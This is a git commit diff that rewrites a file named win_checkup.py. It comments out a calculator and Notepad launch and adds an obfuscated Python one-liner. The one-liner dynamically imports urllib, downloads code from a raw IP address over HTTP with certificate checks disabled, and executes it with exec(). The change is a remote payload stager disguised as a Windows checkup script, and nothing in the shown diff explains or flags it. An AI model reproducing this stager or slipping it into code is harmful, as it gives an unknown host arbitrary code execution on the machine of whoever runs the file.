e805f84639a37e17f3153453ebda604272ed5e38
byjohn1980 <128472633+byjohn1980@users.noreply.github.com>
2023-03-28 11:35:12 +0800

    Update win_checkup.py

--- win_checkup.py
+++ win_checkup.py
@@ -1,1 +1,8 @@
-import osos.system("calc.exe && Notepad.exe")
+#import os
+
+#os.system("calc.exe && Notepad.exe")
+import sys
+import ssl
+
+
+u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://103.234.72.176:8081/mskIHSaK', context=ssl._create_unverified_context());exec(r.read());
